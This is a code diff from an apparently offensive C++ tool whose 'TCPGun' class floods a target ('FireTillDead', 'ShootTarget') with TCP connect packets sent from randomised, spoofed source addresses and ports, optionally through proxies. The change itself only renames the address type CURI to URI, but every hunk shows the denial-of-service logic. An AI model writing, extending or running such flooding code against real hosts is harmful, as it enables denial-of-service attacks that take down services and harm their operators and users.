@@ -12,7 +12,7 @@
 
 using namespace Attackers;
 
-std::size_t TCPGun::FireTillDead(const CURI &targetToKill) noexcept
+std::size_t TCPGun::FireTillDead(const URI &targetToKill) noexcept
 {
 	std::size_t hitsCount{0};
 
@@ -25,7 +25,7 @@ std::size_t TCPGun::FireTillDead(const CURI &targetToKill) noexcept
 	return hitsCount;
 }
 
-bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
+bool TCPGun::FireWithoutProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	// Checking connectivity over proxy, because packets would be send with randomized source
 
@@ -42,7 +42,7 @@ bool TCPGun::FireWithoutProxy(const CURI &targetToKill, std::size_t &hitsCount) 
 	return false;
 }
 
-void TCPGun::FireWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noexcept
+void TCPGun::FireWithProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
 {
 	std::optional<std::vector<Proxy>> proxies;
 	while(!m_currentTask.ShouldStop() &&
@@ -59,13 +59,13 @@ void TCPGun::FireWithProxy(const CURI &targetToKill, std::size_t &hitsCount) noe
 	}
 }
 
-bool TCPGun::ShootTarget(const CURI &targetToShoot, std::size_t &hitsCount)
+bool TCPGun::ShootTarget(const URI &targetToShoot, std::size_t &hitsCount)
 {
 	size_t count = 0;
 	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
 			&& !m_currentTask.ShouldStop(); count++)
 	{
-		CURI fakeSource{GetRandomIP()};
+		URI fakeSource{GetRandomIP()};
 		fakeSource.SetPort(GetRandomPort());
 
 		const TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);
